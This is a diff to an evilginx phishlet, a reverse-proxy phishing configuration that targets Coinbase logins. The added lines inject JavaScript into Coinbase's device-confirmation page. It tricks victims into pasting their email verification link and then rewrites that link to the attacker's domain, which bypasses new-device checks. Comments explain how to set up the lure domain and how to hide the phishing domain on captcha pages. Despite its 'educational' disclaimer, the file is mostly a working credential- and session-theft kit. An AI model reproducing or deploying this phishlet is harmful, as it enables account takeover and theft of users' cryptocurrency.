@@ -1,18 +1,18 @@
- 
 # AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
 # PLEASE DO NOT MISUSE THIS PHISHLET.
 
-# GUIDE TO USE THIS PHISHLET PROPERLY.
+# Don't Forget To set "domain" Params to your domain name (example.com)...
 #
-# I didn't Uploaded the working Phishlet For obvious Reasons.
-# This phishlet is working only some js functions required to bypass/validate the new signed in device.
-# Don't Hesitate to ask me , If you need it for responsible use, I will be glad to help.
+# Use This Command To set the domain params from the evilginx command line.
+# Where ID is lure id number, and EXAMPLE.COM is your domain name.
+# lures edit params ID domain=EXAMPLE.COM
+ 
 
 author: '@An0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'coinbase.com', session: true, is_landing: true}
-  - {phish_sub: 'm', orig_sub: 'ws', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'ws', orig_sub: 'ws', domain: 'coinbase.com', session: true, is_landing: false}
   - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
   - {phish_sub: 'googletag', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'coinbase.com', session: true, is_landing: false}
@@ -48,10 +48,6 @@ sub_filters:
   - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'googletagmanager.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-
-# hcaptcha Alert Domain Name Changing.
-  - {triggers_on: 'www.coinbase.com/signin?__cf_chl_captcha_tk__=', orig_sub: '', domain: 'coinbase.com', search: 'www.{domain}', replace: 'www.{domain}', mimes: ['text/html']}
-  - {triggers_on: 'www.coinbase.com/signin?__cf_chl_captcha_tk__=', orig_sub: '', domain: 'coinbase.com', search: 'www.{domain}', replace: 'www.{domain}', mimes: ['text/html']}
 
 auth_tokens:
   - domain: 'www.coinbase.com'
@@ -89,9 +85,76 @@ login:
   domain: 'www.coinbase.com'
   path: '/signin'
 
-js_inject: #Everything is working Here , Just find out a good idea to validate the new login device somehow, use social engineering skills & js to achieve what you want, It is possible, Ask me the solution if need for testing/security/conference/others excluding illegal use.
+
+# "function lp()" will dynamically replace the contents in device authentication html page, and will create a new input box and button. Some other replacements are just to make page look better.
+# "function ValidateLink()" will replace the domain name 'coinbase.com' with the evilginx server domain name to verify the device from the IP of evilginx server, and will popup a new window with that modified auth link. 
+#  In that way we will be able to successfully authenticate the new device login.
+
+# "function hcaptcha()" will replace the domain name during the captcha validation to decrease the possibility of getting caught by the user.
+
+js_inject:
   - trigger_domains: ["www.coinbase.com"]
     trigger_paths: ["/device_confirmations/new"]
-    trigger_params: []
+    trigger_params: [domain]
     script: |
-      
+      function lp(){
+        var elem1 = document.getElementsByClassName("account-inner")[0];
+        elem1.parentNode.removeChild(elem1); 
+        var elem2 = document.getElementsByClassName("device-support")[0];
+        elem2.parentNode.removeChild(elem2);
+        var div = document.createElement('div');
+        div.className = 'account-inner';
+        div.innerHTML = `
+        <img class="account-icon" src="https://www.coinbase.com/assets/quickstart/icon-signup-9ed7432acbf85046d2a12f1e29f9e245d6e8376b379b524a1ebb6250c993f4d1.png">
+        <div class="account-icon"></div>
+        <h2 class="account-header">Authorize This Login</h2>
+        <p>Copy The Verification Link Received in Email And Paste It Below To Verify The Login </p>
+        <form action="">
+        <fieldset>
+        <input type="url" name="linkVerify" id="linkVerify" placeholder="https://coinbase.com/device_confirmations/confirm_email?token=xxxxxxxxxxxxxxxx" pattern="https://.*"> 
+        <input class="btn" type="button" value="Verify Device" onclick="ValidateLink()">
+        </fieldset></form>
+        <p></p>
+        `;
+        document.getElementsByClassName("account-form device-confirmation")[0].appendChild(div);
+        var div = document.createElement('div');
+        div.className = 'device-support';
+        div.innerHTML = `
+        <p>Email didn't arrive?</p>
+        <p>Visit our <a href="https://support.coinbase.com/customer/portal/articles/2521789">Support Center</a>.</p>
+        <p></p>
+        <p>
+        <a href="/email_recovery/new">
+          I no longer have access to my email address
+        </a>      </p>
+        `;
+        document.getElementsByClassName("account-form device-confirmation")[0].appendChild(div);
+        return;
+      }
+      function ValidateLink(){
+        var domain = "{domain}"
+        var link1 = document.getElementById("linkVerify").value;
+        var link2 = link1.replace('coinbase.com', domain);
+        console.log(link2)
+        window.open(link2, '_blank').focus();
+      }
+      setTimeout(function(){ lp(); }, 2500);
+
+
+# HCAPTCHA Header That shows domain name can be Replaced dynamically with javascripts, Its Disabled Here Because Its resulting in Hcaptcha error, Find your ways to solve it.
+#
+#  - trigger_domains: ["www.coinbase.com"]
+#    trigger_paths: ["/signin","/signin*"]
+#    trigger_params: []
+#    script: |
+#      function hcaptcha(){
+#        var elem = document.getElementsByClassName("cf-subheadline")[0];
+#        elem.parentNode.removeChild(elem);
+#        var div = document.createElement('div');
+#        div.className = 'cf-subheadline';
+#        div.innerHTML = `
+#        <h2 class="cf-subheadline"><span data-translate="complete_sec_check">Please complete the security check to get access to</span> Coinbase Website</h2>
+#        `;
+#        document.getElementsByClassName("cf-wrapper cf-header cf-error-overview")[0].appendChild(div);
+#        return;
+#        }    
